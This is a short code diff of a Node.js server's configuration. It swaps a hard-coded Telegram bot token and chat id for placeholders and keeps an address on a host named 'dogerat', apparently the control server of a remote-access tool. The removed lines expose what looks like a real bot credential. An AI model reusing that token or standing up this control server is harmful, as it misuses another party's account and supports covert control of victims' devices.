@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8358677128:AAGrDzq4F0PLRpCd_uRevF2zdH948kC0TFA'
-const id = '955628072'
+const token = 'toke'
+const id = 'chat'
 const address = 'https://dogerat-0gpo.onrender.com'
 
 const app = express();
